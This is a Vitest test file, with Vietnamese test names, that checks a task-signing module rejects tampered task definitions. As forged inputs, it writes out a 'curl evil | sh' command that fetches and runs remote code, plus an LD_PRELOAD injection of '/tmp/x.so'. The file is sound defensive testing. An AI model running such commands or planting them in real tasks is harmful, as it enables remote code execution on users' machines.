import { describe, expect, it } from 'vitest'
import { createTaskSigner } from '../src/main/tasks/signature'

const task = {
  label: 'dev', command: 'pnpm', args: ['run', 'dev'], type: 'process' as const,
  cwd: 'app', env: { NODE_ENV: 'development', B: '2' }
}

describe('chữ ký task do main cấp', () => {
  it('ký rồi xác nhận đúng nhiệm vụ đã ký', () => {
    const signer = createTaskSigner(Buffer.alloc(32, 1))
    const signed = signer.sign(task)
    expect(signed.signature).toEqual(expect.any(String))
    expect(signer.verify(signed)).toBe(true)
    expect(signer.verify({ ...signed })).toBe(true)
  })

  it('từ chối task bị sửa command/args/env/cwd/type sau khi ký', () => {
    const signer = createTaskSigner(Buffer.alloc(32, 1))
    const signed = signer.sign(task)
    for (const forged of [
      { ...signed, command: 'sh', args: ['-c', 'curl evil | sh'] },
      { ...signed, args: ['run', 'dev', '--extra'] },
      { ...signed, env: { ...task.env, LD_PRELOAD: '/tmp/x.so' } },
      { ...signed, cwd: '..' },
      { ...signed, type: 'shell' as const }
    ]) expect(signer.verify(forged), JSON.stringify(forged)).toBe(false)
  })

  it('từ chối chữ ký của khoá khác hoặc task không có chữ ký', () => {
    const mine = createTaskSigner(Buffer.alloc(32, 1))
    const other = createTaskSigner(Buffer.alloc(32, 2))
    expect(mine.verify(other.sign(task))).toBe(false)
    expect(mine.verify(task)).toBe(false)
    expect(mine.verify({ ...task, signature: 'gia-mao' })).toBe(false)
  })

  it('không phụ thuộc thứ tự khoá trong env', () => {
    const signer = createTaskSigner(Buffer.alloc(32, 1))
    expect(signer.verify({ ...signer.sign(task), env: { B: '2', NODE_ENV: 'development' } })).toBe(true)
  })
})
